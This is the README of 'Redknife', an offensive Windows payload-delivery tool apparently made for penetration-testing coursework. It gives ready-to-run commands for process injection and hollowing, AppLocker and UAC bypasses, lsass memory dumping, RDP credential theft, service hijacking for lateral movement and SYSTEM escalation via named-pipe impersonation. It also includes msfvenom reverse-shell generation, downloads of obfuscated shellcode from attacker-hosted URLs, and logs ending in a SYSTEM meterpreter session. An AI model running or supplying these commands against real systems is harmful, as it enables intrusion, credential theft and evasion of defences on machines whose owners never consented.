# Redknife

A command-line payload delivery and execution tool.

Redknife obtains a payload from either a URL, file or directly via a command-line argument. This payload can contain encoded shell buffers, commands to execute etc. - functionality is dependent on the module specified.

Redknife's main functionality is delivered via modules - when launching Redknife, a module is specified via the `--module` arg. Modules exist for spawning new threads, injecting into processes, process hollowing etc., as well as other utilities such as executing shell commands and creating PowerShell runspaces (allowing for constrained language mode bypass).

Redknife can be run as an InstallUtil uninstaller, potentially allowing Redknife to bypass Applocker restrictions. Redknife can also be serialised by James Forshaw's DotNetToJScript tool, for use in CScript JavaScript/HTA files.

## Parameters

Redknife supports a number of different arguments.

### General arguments

- `--debug` - Sets the log level to debug (default log level is `INFO`).
- `--quiet` - Suppresses all output. This option overrides the `--debug` flag.
- `--help` - outputs the help info
- `--evasion` - whether to try basic evasion techniques (such as sleep timer) to evade detection

### Arguments to relating to the payload supplied to Redknife

- `--file FILE` - Specifies the path of the file to load the payload from.
- `--url URL` - Specifies a URL to load the payload from.
- `--payload PAYLOAD` - Specifies the payload directly as an argument.
- `--transforms TRANSFORMS` - the list of transformations to apply to the payload, comma delimited

### Arguments instructing Redknife what to do

- `--module MODULE` - Specifies the module to execute the payload on.
- `--escalate ESCALATE_MODULE` - Specifies the name of the escalation type to perform to obtain privilege escalation.

### Arguments used by specific modules

Note that the functionality supplied by these arguments are dependent on the module used.

- `--process PROCESS_NAME` - the process name to operate on. This is overridden if `--pid` is also specified.
- `--pid PID` - the process ID to operate on. If specifying a `--pid` and a `--process` value, `--pid` overrides `--process`. 
- `--output-file FILE` - the output file to write to.
- `--pipe-name NAME` - the name of the named pipe to operate on.
- `--host-name HOST` - the host name to target in the specified module. (i.e. in the `hijack-remote-service` module)
- `--service-name SERVICE` - the name of the service to target (i.e. in the `hijack-remote-service` module)

## Modules

Redknife has the following modules (as listed in `ComponentDefinitions.cs`):

- `exec-ps` - Executes the payload as PowerShell script (maps to `Modules/PowerShellScript.cs`)
- `new-thread` - spawns a new thread to execute the payload in (maps to `Modules/SpawnNewThread.cs`)
- `process-inject` - Inject payload and create thread in process defined by `--pid` or `--process` parameter (maps to `Modules/SimpleProcessInjection.cs`)
- `nt-process-inject` - Inject payload and create thread in process (using `NtDLL` methods) defined by `--pid` or `--process` parameter (maps to `Modules/NtProcessInjection.cs`)
- `process-hollow` - Starts an instance of `svchost.exe`, which is then hollowed and replaced with payload (maps to `Modules/ProcessHollower.cs`)
- `shell-cmd` - Execute a shell command, defined in the payload, as specified by either `--file`,` --url` or `--payload` parameters (maps to `Modules/ExecuteShellCommand.cs`)
- `process-dump` - Dump a process' memory. Specify the ID or name of the process to dump via the `--pid` or `--process` arguments respectively. The output file can be controlled via `--output-file` (otherwise defaults to %TEMP% - maps to `Modules/ProcessMemoryDump.cs`)
- `rdp-thief` - Inject the` RDPThief.dll` into running `mstsc` processes. The payload passed to the module must represent the path to the `RDPThief.dll` on the target system (this is not written by Redknife) (maps to `Modules/RDPThief.cs`)
- `hijack-remote-service` - Lateral movement via reconfiguration of a remote service. Current user should have permission to edit the service on the remote host. Use `--service-name` to specify service, `--host-name` to specify remote machine (maps to `Modules/HijackRemoteService.cs`)

## Escalation/UAC bypass

Redknife has the following escalation/UAC bypass modules:

- `FODHelper` - sets the appropriate registry keys and relaunches Redknife using the FOD Helper UAC bypass. All arguments passed to Redknife are preserved and passed to the re-launched instance of Redknife.
- `NamedPipeSeImpersonate` - creates a named pipe (defined by `--pipe-name)

## Transforms

Redknife can apply the following transforms to a payload:

- `base64` - base64 decodes the payload
- `xor=VALUE` - XORs the payload with the specified string value
- `caesar=VALUE` - performs a caesar shift on each byte in the payload. The shift value is determined by the value string, which must be numeric (although, can be negative).
- `reverse` - reverses the payload

The order of the transforms is important, and must be done in the reverse order that the transformations were applied to the original payload.

When specifying transforms, use a quoted string with comma-delimited transforms, i.e.: `--transforms "base64,xor=foo,caesar=-5"`

## Specifying arguments in a text file

Some situations might limit the parameters you can pass to an executable. As such, Redknife has the ability to read it's args from a text file. Args should be specified in the same format as they would normally be passed in cmd line args.

Redknife has a predefined search order looking for arg files - if a file is found, the search finishes:

1. Redknife.txt in the current directory (i.e. dir in which Redknife.exe is executing)
2. ProcessName.txt in the current directory (i.e. in case executable has been renamed)
3. `C:\redknife.txt`
4. `C:\PROCESS_NAME.txt` (in case executable has been renamed)

## DotNetToJScript

The Redknife executable can be encapsulated as a DotNetToJScript payload for inclusion in a JScript/VBScript/HTA file.

As Redknife loads a staged payload from a file or URL, a number of arguments must be supplied. As such, it is necessary to supply the `-s` parameter to `DotNetToJScript.exe` and include an additional JScript block that calls the required Redknife functionality.

As an example, to load a remote payload and execute it in a new thread within the Redknife process, the additional JScript would be supplied:

```JavaScript
// Define the args for Redknife
var RedknifeArgs = "--url http://192.168.45.208:9000/Redknife.payload --module new-thread --transforms base64,xor=foo,caesar=-5";
o.ParseArgumentsFromString(RedknifeArgs);
o.Run();
```

These are passed to the created Redknife instance when created.

Assuming the args above have been saved in a file named `redknife-args.txt`, the command to generate a Redknife JavaScript file is:

```cmd
DotNetToJScript.exe Redknife.exe -l JScript -v v4 -c Redknife.Redknife -s redknife-args.txt -o redknife.js
```

Note that the `-c Redknife.Redknife` arg is the name of the class that get's created by DotNetToJScript - in this case, it's an instance of class `Redknife`  within the `Redknife` namespace. Once the class has been created, the additional snipped of script (defined in `redknife-args.txt`)  calls `ParseArgumentsFromString` on the created `Redknife` class, passing in the string representation of the args. It then calls `Run` on the created class, which kicks off the main Redknife functionality.

Once `redknife.js` has been generated, any changes to the args to pass to Redknife can simply be made in the generated JS file itself, rather than generating a new file using DotNetToJScript.

The generated JS file can be tested from cscript.exe using the following command:

```cmd
cscript.exe redknife.js
```

### Notes

- `cscript.exe` creates a 64-bit process - use a 64-bit payload and appropriate metasploit handler.

## PowerShell Execution

Redknife includes a PowerShell language execution module, which can execute PowerShell in environments where PS is restricted, or where PowerShell is limited to restricted language mode.

To invoke this module, use the `--module exec-ps` command line argument. The PowerShell code should be supplied as the payload to the module.

**Note:** Aside from the normal transformations, if the PowerShell module detects that the payload is Base64 encoded (i.e. length is modulo 4 and matches Base64 regex) then it will attempt to Base64 decode the payload before execution.

### Examples

#### Script execution via `ps-cmd`

```PowerShell
Redknife.exe --module exec-ps --payload "(Get-Content C:\\Tools\\PowerUp.ps1 -Raw) | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\output.txt" --debug
```

The snippet above reads the `PowerUp.ps1` script from `C:\\Tools`, calls `Invoke-Expression` to add the PowerUp code to the context and then calls the `Invoke-AllChecks` method (added by the script). Output is redirected to a specific output file (although Redknife will print the output to the console, it isn't formatted as well as it would otherwise be.)

#### Listing processes and displaying output

```PowerShell
Redknife.exe --module exec-ps --payload "Get-Process | Format-Table | Out-String" --debug
```

Gets current running processes, formats the output in table form and converts to string.

## Running Redknife as an InstallUtil uninstall script (LOLBin)

You can run `Redknife.exe` as a uninstall target for the Microsoft.NET framework `installutil.exe` utility ("living off the land binary" - LOLBin), which is located in directory `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\`.

InstallUtil will attempt to uninstall the executable specified in the command, and call the executable's `Uninstall` method. When running in this mode, you cannot pass arguments to Redknife - you must place a plain text argument file (containing the args to parse) in one of the predefined locations:

1. The same local directory in which the Redknife executable is located
2. The current Environment temp folder (returned by `Path.GetTempPath()`)
3. The root `C:\` directory

For each of these locations, Redknife first attempts to load a file named `Redknife.txt`, then if the name of the executing assembly is different (I.e. you have renamed Redknife.exe), `APPNAME.txt` (where APPNAME represents the name of the executable).

Redknife can call any module you would normally be able to call from this method (previously only PowerShell commands could be executed).

### Example Invocation 

#### Noisy - shows Redknife output on console

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\Redknife.exe
```

## Dumping process memory

Redknife has a module (`process-dump`) that allows it to dump a process' memory. The process to dump should be specified, either by name using the `--process` argument, or by ID using `--pid`. 

This calls method `MiniDumpWriteDump` in the `Dbghelp` DLL.

If no `--output-file` is provided, the dump is saved to the same directory that Redknife is executing from with a filename in format: `Process_PROCESSNAME_DATETIME.dmp`. 

If `--output-file` is a directory, the default file name ( `Process_PROCESSNAME_DATETIME.dmp`) is output to the specified directory. If `--output-file` specifies a file, the dump is written to the specified path.

### Examples

#### Dump lsass process by name to current directory

```cmd
C:\temp>Redknife.exe --module process-dump --process lsass --debug
```

#### Dump lsass process by ID to specified path

```cmd
Redknife.exe --module process-dump --pid 612 --output-file C:\lsass.dmp
```

## Pre-Canned Examples

### Executing PowerShell via InstallUtil Uninstall

Save `Redknife.txt` file within same dir as Redknife executable:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Temp\Redknife.exe
```

### Priv Esc via Named Pipe and Process Hollowing

Meterpreter payload generated using:

```bash
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.45.215 LPORT=8080 -f raw > Redknife.payload
```

Running python web server to serve payload:

```bash
└─$ python -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
192.168.240.10 - - [15/Jan/2024 15:18:44] "GET /Redknife.payload HTTP/1.1" 200 -
```

Redknife invocation:

```cmd
C:\Windows\system32>C:\Temp\Redknife.exe --debug --escalate NamedPipeSeImpersonate --pipe-name foobar --module process-hollow --url http://192.168.45.215:9000/Redknife.payload
```

### Priv Esc with raw payload and recursive invocation

Some PrivEsc methods work with modules, other are a bit more fiddly. For instance, privesc with process hollowing works on some boxes, but not others. PrivEsc and shell-cmd works well (as the new process used to launch the shell cmd will use the elevated token), however this isn't really applicable if you don't have an executable or script that you can launch via a shell command (i.e. this requires you dropping a script on the disk before the Redknife invocation).

If you have a raw meterpreter payload and want to call this directly, use a recursive invocation:

```cmd
C:\Temp>Redknife.exe --debug --escalate NamedPipeSeImpersonate --pipe-name foobar --module shell-cmd --payload "C:\Temp\Redknife.exe --debug --module new-thread --url http://192.168.45.228:9000/Redknife.payload"
```

This launches Redknife twice - the first instance performs the Priv Esc via NamedPipeSeImpersonation. The module for this instance is `shell-cmd`, and the payload is a raw payload containing the command to execute (which, in this case, is Redknife again). Once a privileged process connects to the named pipe, the first instance of Redknife copies the token and launches the command in the payload (which is Redknife), launching a new instance of Redknife with elevated privileges from the outset. In the above example, the second Redknife instance reads it's payload from a URL, which is then executed in a new thread in the current (elevated Redknife) process. From here, we can use any module we like without worrying whether the module is compatible with the escalation method.

### Redknife as PrintSpoofer (PetitPotam) with EXE payload

```
C:\Temp>Redknife.exe --debug --escalate NamedPipeSeImpersonate --pipe-name "test\pipe\spoolss" --module shell-cmd --payload "C:\Temp\met.exe"
```

Then, from another Windows shell (on the same box):

```
C:\> C:\path\to\SpoolSample.exe hostname hostname/pipe/test
```

### Redknife as PrintSpooler (PetitPotam) with obfuscated, remote shellcode payload

Generate a payload and obfuscate it (i.e. XOR, caesar shift etc).

I.e.:

```
┌──(darren㉿kali)-[~/kali-shared/PEN-300]
└─$ python rk-encode-payload.py --payload payloads/payload.ps1 --transforms="caesar=5,xor=foo"
[+] Read payload from file: payloads/payload.ps1
[-]   Payload:
0xfc,0x48,0x83,...0xa,0x41,0x89,0xda,0xff,0xd5

[+] Transforms to apply caesar=5,xor=foo
[-]   Applying caesar shift of 5
[-]   XORing payload with phrase: foo
[+] Transformed payloads:
[-]   Raw byte array
[103, 34, 231, 143, 154, 130, 183, 106, 106, 99, 41, 57, 32, 58, 56, 43, 89, 184, 48, 5, 34, 246, ...225, 176, 98, 181]
----------------------------------------------------------------------------------------------------
[-]   Formatted byte array
0x67,0x22,0xe7,0x8f,0x9a,0x82,0xb7,0x6a,0x6a,0x63,0x29,0x39,0x20,0x3a,0x38,0x2b,0x59,0xb8,0x30,0x5,0x22...0x20,0xe1,0xb0,0x62,0xb5
----------------------------------------------------------------------------------------------------
[-]   Hex string
6722e78f9a82b76a6a6...20e1b062b5
----------------------------------------------------------------------------------------------------
[-]   'X' hex string
\x67\x22\xe7\x8f\x9a\x82\xb7\x6a\x6a\x63\x29\x39\x20\x3a\x38\x2b\x59\xb8\x30\x05\x22\xf6\x38\x0a\x2b\...
x32\xa7\x3b\x00\x6a\x38\xaf\x8a\x44\x40\x60\x20\xe1\xb0\x62\xb5
----------------------------------------------------------------------------------------------------
[-]   Hex dump
67 22 e7 8f 9a 82 b7 6a 6a 63 29 39 20 3a 38 2b 
...
2b 69 a7 ec aa 15 b1 32 a7 3b 00 6a 38 af 8a 44 
40 60 20 e1 b0 62 b5 
----------------------------------------------------------------------------------------------------
[-]   Base64
ZyLnj5qCt2pqYyk5IDo4K1m4MAUi9jgKK/84ezQi9jhKK3vTKSAi9hg6NFmhK1mq1y4J52heQympqH0pYKmIlDgi9jhK9iguIDkiYLoE4BJydmh77BhqY2r/4+JqY2oi7KoWCiJps/8iezom9ipKKGm6jjQiYqE9UKEp9lbiK2m0K1mqIKmhdN4pYKlSgxWZN2c+T2IlWLkVuzIm9ipGKGm6DSn/dyIm9ipOKGm6IP9m6ykyK2m6IDIMODApOykxIDAi7p5KIDhrgzIpODAi9niBNmtrYg0iUI83KKwTCBwBFQUWYyk0K+GJKKOoNxNEamu1Pjci6Ik3OT1Zoz1ZqDc3KNBQPRHDY2pqY2u1i3tqY2pZWFhcUFRSVVZVVVlUWmowK+GpKKOqpmlqYz1ZqDc3CWc3KNAz6MukY2pqY2u1iw5qY2pbORkwURY5EAUEXyU7FildPgkdETMlGgMYCyk5AVYzDwUDFz4gWCccGxI9G1YXDVIlGSYDP1M7OSUGPxo1GzMzLDsmKjNTG1UQGlIAPylZWiJSMlQ4G1hZFQsSYyLhoDcwIDI9UKE3K9JqUcLmY2pqYzo3PiGjoZ81VS9rvCLhrQBgAiLhkABLOTgC41dqYyHhgwBmIDEh2RUkxeRqY2pqYrU9UKo3OSLhkD1ZqD1ZqDc3KKOoVGRy5mu17KoVQiKjoOJ3Y2oh2SaaXIpqY2pqYrUiYrsWYZ/AizVqY2o3OAAqOSHhsKmIcyGjo2p6Y2oh2TLGPoVqY2pqYrUi/jc3K+GDK+GZK+GwKKOqY0pqYyHhmCHQcfThgWpqY2prvCLnr0rloxbYDf9jK2mn7KoVsTKnOwBqOK+KREBgIOGwYrU=
----------------------------------------------------------------------------------------------------
```

Save the Base64 output as `payloads/Redknife.payload` on server.

Need to launch Redknife from Redknife itself - first invocation executes the priv esc via PrintSpooler

```
C:\Tools>Redknife.exe --debug --escalate NamedPipeSeImpersonate --pipe-name "test\pipe\spoolss" --module shell-cmd --payload "cmd.exe /C C:\Temp\Redknife.exe --debug --module new-thread --url http://192.168.45.167:9000/payloads/Redknife.payload --transforms \"base64,xor=foo,caesar=-5\""
[>] Starting Redknife with options:
[-]   - URL:
[-]   - File:
[-]   - Use Evasion: False
[-]   - Escalate: NamedPipeSeImpersonate
[-]   - Module: shell-cmd
[-]   - PID:
[-]   - Process Name:
[-]   - Quiet: False
[-]   - Debug: True
[-]   - Help: False
[+] Logging level: DEBUG
[+] Loading payload from string provided: cmd.exe /C C:\Temp\Redknife.exe --debug --module new-thread --url http://192.168.45.167:9000/payloads/Redknife.payload --transforms "base64,xor=foo,caesar=-5"
[-]   OK! Payload contains 159 bytes
[+] Payload:
================================================================
cmd.exe /C C:\Temp\Redknife.exe --debug --module new-thread --url http://192.168.45.167:9000/payloads/Redknife.payload --transforms "base64,xor=foo,caesar=-5"
================================================================
```

Now execute SpoolSample:

```
C:\> C:\path\to\SpoolSample.exe hostname hostname/pipe/test
```

Observe output in Redknife:

```
[+] Performing privilege escalation
[+] Executing NamedPipeSeImpersonate escalation...
[-]   Creating named pipe: \\.\pipe\test\pipe\spoolss
[-]   Connecting to named pipe: \\.\pipe\test\pipe\spoolss
[-]   Connection received!
[+] Client connected to named pipe '\\.\pipe\test\pipe\spoolss' with SID: S-1-5-18
[-]   Escalation done
[+] No payload transformations to apply
[+] Executing shell command module...
[>] Launching executable: cmd.exe, with args: /C C:\Temp\Redknife.exe --debug --module new-thread --url http://192.168.45.167:9000/payloads/Redknife.payload --transforms "base64,xor=foo,caesar=-5"
[+] Current thread has impersonation privilege - executing process with token
[+] System directory is: C:\Windows\system32
[+] Impersonated user is: NT AUTHORITY\SYSTEM
[+] Calling CreateProcessWithTokenW - payload: cmd.exe /C C:\Temp\Redknife.exe --debug --module new-thread --url http://192.168.45.167:9000/payloads/Redknife.payload --transforms "base64,xor=foo,caesar=-5"
[>] Executed with impersonated token: cmd.exe /C C:\Temp\Redknife.exe --debug --module new-thread --url http://192.168.45.167:9000/payloads/Redknife.payload --transforms "base64,xor=foo,caesar=-5"
```

The payload for the above points to Redknife, launching a new-thread module which downloads the payload from URL http://192.168.45.167:9000/payloads/Redknife.payload. This payload is also obfuscated, so the 2nd Redknife invocation transforms the payload appropriately on launch:

```
[>] Starting Redknife with options:
[-]   - URL: http://192.168.45.167:9000/payloads/Redknife.payload
[-]   - File:
[-]   - Transforms:
[-]     [1]: base64
[-]     [2]: xor=foo
[-]     [3]: caesar=-5
[-]   - Use Evasion: False
[-]   - Escalate:
[-]   - Module: new-thread
[-]   - PID:
[-]   - Process Name:
[-]   - Quiet: False
[-]   - Debug: True
[-]   - Help: False
[+] Logging level: DEBUG
[+] Attempting to read payload from URL: http://192.168.45.167:9000/payloads/Redknife.payload
[-]   OK! Payload contains 865 bytes
[+] Payload:
================================================================
ZyLnj5qCt2pq...qY2prvCLnr0rloxbYDf9jK2mn7KoVsTKnOwBqOK+KREBgIOGwYrU=

================================================================
[+] Transforming payload - 3 pending transformations
[>] Initial buffer, before transformations:
BUFFER:
5a 79 4c 6e 6a 35 71 43 74 32 70 71 59 79 6b 35
...
4f 4b 2b 4b 52 45 42 67 49 4f 47 77 59 72 55 3d
0a
[>] Finalised payload buffer:
BUFFER:
67 22 e7 8f 9a 82 b7 6a 6a 63 29 39 20 3a 38 2b
...
2b 69 a7 ec aa 15 b1 32 a7 3b 00 6a 38 af 8a 44
40 60 20 e1 b0 62 b5
[-]   Transforming buffer - XOR with key: foo
[>] Finalised payload buffer:
BUFFER:
01 4d 88 e9 f5 ed d1 05 05 05 46 56 46 55 57 4d
36 d7 56 6a 4d 90 57 65 4d 90 57 1d 5b 4d 90 57
...
4d 06 c8 8a c5 7a d7 5d c8 5d 6f 05 5e c0 e5 22
2f 0f 46 8e df 04 da
[-]   Transforming buffer - Caesar with key: -5
[>] Finalised payload buffer:
BUFFER:
fc 48 83 e4 f0 e8 cc 00 00 00 41 51 41 50 52 48
...
48 01 c3 85 c0 75 d2 58 c3 58 6a 00 59 bb e0 1d
2a 0a 41 89 da ff d5
[+] Finished transforming buffer: applied 3 transformations
[>] Spawning new thread for payload
[-]   Allocating memory for payload, size: 647 bytes
[-]   Copying payload to allocated memory
[-]   Creating new thread to execute payload
[>] Waiting for thread execution
```

Meterpreter output:

```
[*] Meterpreter session 3 opened (192.168.45.167:443 -> 192.168.164.100:52120) at 2024-02-08 15:33:13 +0000

meterpreter > 
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

### Downloading an obfuscated payload from URL

Generate a payload and obfuscate it (i.e. XOR, caesar shift etc).

I.e.:

```
┌──(darren㉿kali)-[~/kali-shared/PEN-300]
└─$ python rk-encode-payload.py --payload payloads/payload.ps1 --transforms="caesar=5,xor=foo"
[+] Read payload from file: payloads/payload.ps1
[-]   Payload:
0xfc,0x48,0x83,...0xa,0x41,0x89,0xda,0xff,0xd5

[+] Transforms to apply caesar=5,xor=foo
[-]   Applying caesar shift of 5
[-]   XORing payload with phrase: foo
[+] Transformed payloads:
[-]   Raw byte array
[103, 34, 231, 143, 154, 130, 183, 106, 106, 99, 41, 57, 32, 58, 56, 43, 89, 184, 48, 5, 34, 246, ...225, 176, 98, 181]
----------------------------------------------------------------------------------------------------
[-]   Formatted byte array
0x67,0x22,0xe7,0x8f,0x9a,0x82,0xb7,0x6a,0x6a,0x63,0x29,0x39,0x20,0x3a,0x38,0x2b,0x59,0xb8,0x30,0x5,0x22...0x20,0xe1,0xb0,0x62,0xb5
----------------------------------------------------------------------------------------------------
[-]   Hex string
6722e78f9a82b76a6a6...20e1b062b5
----------------------------------------------------------------------------------------------------
[-]   'X' hex string
\x67\x22\xe7\x8f\x9a\x82\xb7\x6a\x6a\x63\x29\x39\x20\x3a\x38\x2b\x59\xb8\x30\x05\x22\xf6\x38\x0a\x2b\...
x32\xa7\x3b\x00\x6a\x38\xaf\x8a\x44\x40\x60\x20\xe1\xb0\x62\xb5
----------------------------------------------------------------------------------------------------
[-]   Hex dump
67 22 e7 8f 9a 82 b7 6a 6a 63 29 39 20 3a 38 2b 
...
2b 69 a7 ec aa 15 b1 32 a7 3b 00 6a 38 af 8a 44 
40 60 20 e1 b0 62 b5 
----------------------------------------------------------------------------------------------------
[-]   Base64
ZyLnj5qCt2pqYyk5IDo4K1m4MAUi9jgKK/84ezQi9jhKK3vTKSAi9hg6NFmhK1mq1y4J52heQympqH0pYKmIlDgi9jhK9iguIDkiYLoE4BJydmh77BhqY2r/4+JqY2oi7KoWCiJps/8iezom9ipKKGm6jjQiYqE9UKEp9lbiK2m0K1mqIKmhdN4pYKlSgxWZN2c+T2IlWLkVuzIm9ipGKGm6DSn/dyIm9ipOKGm6IP9m6ykyK2m6IDIMODApOykxIDAi7p5KIDhrgzIpODAi9niBNmtrYg0iUI83KKwTCBwBFQUWYyk0K+GJKKOoNxNEamu1Pjci6Ik3OT1Zoz1ZqDc3KNBQPRHDY2pqY2u1i3tqY2pZWFhcUFRSVVZVVVlUWmowK+GpKKOqpmlqYz1ZqDc3CWc3KNAz6MukY2pqY2u1iw5qY2pbORkwURY5EAUEXyU7FildPgkdETMlGgMYCyk5AVYzDwUDFz4gWCccGxI9G1YXDVIlGSYDP1M7OSUGPxo1GzMzLDsmKjNTG1UQGlIAPylZWiJSMlQ4G1hZFQsSYyLhoDcwIDI9UKE3K9JqUcLmY2pqYzo3PiGjoZ81VS9rvCLhrQBgAiLhkABLOTgC41dqYyHhgwBmIDEh2RUkxeRqY2pqYrU9UKo3OSLhkD1ZqD1ZqDc3KKOoVGRy5mu17KoVQiKjoOJ3Y2oh2SaaXIpqY2pqYrUiYrsWYZ/AizVqY2o3OAAqOSHhsKmIcyGjo2p6Y2oh2TLGPoVqY2pqYrUi/jc3K+GDK+GZK+GwKKOqY0pqYyHhmCHQcfThgWpqY2prvCLnr0rloxbYDf9jK2mn7KoVsTKnOwBqOK+KREBgIOGwYrU=
----------------------------------------------------------------------------------------------------
```

Save the Base64 output as `payloads/Redknife.payload` on server.

Input transforms were `xor=foo,caesar=5` so reverse process will be `base64,caesar=-5,xor=foo`  to account for the base64 encoding used.

Launch Redknife:

```
Z:\Redknife\RedknifeApp\bin\x64\Release>Redknife.exe --debug --module new-thread --url http://192.168.45.167:9000/payloads/Redknife.payload --transforms "base64,xor=foo,caesar=-5"
[>] Starting Redknife with options:
[-]   - URL: http://192.168.45.167:9000/payloads/Redknife.payload
[-]   - File:
[-]   - Transforms:
[-]     [1]: base64
[-]     [2]: xor=foo
[-]     [3]: caesar=-5
[-]   - Use Evasion: False
[-]   - Escalate:
[-]   - Module: new-thread
[-]   - PID:
[-]   - Process Name:
[-]   - Quiet: False
[-]   - Debug: True
[-]   - Help: False
[+] Logging level: DEBUG
[+] Attempting to read payload from URL: http://192.168.45.167:9000/payloads/Redknife.payload
[-]   OK! Payload contains 865 bytes
[+] Payload:
================================================================
ZyLnj5qCt2pqYyk5IDo4K1m4MAUi9jgKK/84ezQi9jhKK3vTKSAi9hg6NFmhK1mq1y4J52heQympqH0pYKmIlDgi9jhK9iguIDkiYLoE4BJydmh77BhqY2r/4+JqY2oi7KoWCiJps/8iezom9ipKKGm6jjQiYqE9UKEp9lbiK2m0K1mqIKmhdN4pYKlSgxWZN2c+T2IlWLkVuzIm9ipGKGm6DSn/dyIm9ipOKGm6IP9m6ykyK2m6IDIMODApOykxIDAi7p5KIDhrgzIpODAi9niBNmtrYg0iUI83KKwTCBwBFQUWYyk0K+GJKKOoNxNEamu1Pjci6Ik3OT1Zoz1ZqDc3KNBQPRHDY2pqY2u1i3tqY2pZWFhcUFRSVVZVVVlUWmowK+GpKKOqpmlqYz1ZqDc3CWc3KNAz6MukY2pqY2u1iw5qY2pbORkwURY5EAUEXyU7FildPgkdETMlGgMYCyk5AVYzDwUDFz4gWCccGxI9G1YXDVIlGSYDP1M7OSUGPxo1GzMzLDsmKjNTG1UQGlIAPylZWiJSMlQ4G1hZFQsSYyLhoDcwIDI9UKE3K9JqUcLmY2pqYzo3PiGjoZ81VS9rvCLhrQBgAiLhkABLOTgC41dqYyHhgwBmIDEh2RUkxeRqY2pqYrU9UKo3OSLhkD1ZqD1ZqDc3KKOoVGRy5mu17KoVQiKjoOJ3Y2oh2SaaXIpqY2pqYrUiYrsWYZ/AizVqY2o3OAAqOSHhsKmIcyGjo2p6Y2oh2TLGPoVqY2pqYrUi/jc3K+GDK+GZK+GwKKOqY0pqYyHhmCHQcfThgWpqY2prvCLnr0rloxbYDf9jK2mn7KoVsTKnOwBqOK+KREBgIOGwYrU=

================================================================
BUFFER:
5a 79 4c 6e 6a 35 71 43 74 32 70 71 59 79 6b 35
49 44 6f 34 4b 31 6d 34 4d 41 55 69 39 6a 67 4b
4b 2f 38 34 65 7a 51 69 39 6a 68 4b 4b 33 76 54
...
4b 32 6d 6e 37 4b 6f 56 73 54 4b 6e 4f 77 42 71
4f 4b 2b 4b 52 45 42 67 49 4f 47 77 59 72 55 3d
0a
BUFFER:
67 22 e7 8f 9a 82 b7 6a 6a 63 29 39 20 3a 38 2b
59 b8 30 05 22 f6 38 0a 2b ff 38 7b 34 22 f6 38
4a 2b 7b d3 29 20 22 f6 18 3a 34 59 a1 2b 59 aa
...
2b 69 a7 ec aa 15 b1 32 a7 3b 00 6a 38 af 8a 44
40 60 20 e1 b0 62 b5
[>] Transforming buffer - XOR with key: foo
BUFFER:
01 4d 88 e9 f5 ed d1 05 05 05 46 56 46 55 57 4d
36 d7 56 6a 4d 90 57 65 4d 90 57 1d 5b 4d 90 57
...
05 05 05 04 da 4d 88 c9 25 8a c5 79 b7 6b 90 0c
4d 06 c8 8a c5 7a d7 5d c8 5d 6f 05 5e c0 e5 22
2f 0f 46 8e df 04 da
[>] Transforming buffer - Caesar with key: -5
BUFFER:
fc 48 83 e4 f0 e8 cc 00 00 00 41 51 41 50 52 48
31 d2 51 65 48 8b 52 60 48 8b 52 18 56 48 8b 52
...
48 01 c3 85 c0 75 d2 58 c3 58 6a 00 59 bb e0 1d
2a 0a 41 89 da ff d5
[>] Spawning new thread for payload
[-]   Allocating memory for payload, size: 647 bytes
[-]   Copying payload to allocated memory
[-]   Creating new thread to execute payload
[>] Waiting for thread execution
```

### Using Redknife to run Redknife-ad-enumerate PowerShell script

```
--debug --module exec-ps --url "http://192.168.45.227:9000/Tools/Redknife-enum.ps1"
```

### FODHelper UAC bypass

```
Redknife.exe --escalate FODHelper --module shell-cmd --payload "cmd.exe" --debug
```

### Hijacking a Service Executable

Redknife can be used to change a service executable, either on localhost or a remote machine.

```
C:\Tools> Redknife.exe --debug --module hijack-remote-service --service-name SERVICENAME --host-name HOSTNAME --payload PAYLOAD
```

Payload should contain the path to the executable to replace the service binary with. Payload can also contain all the parameters/cmd line args to be passed to the service executable.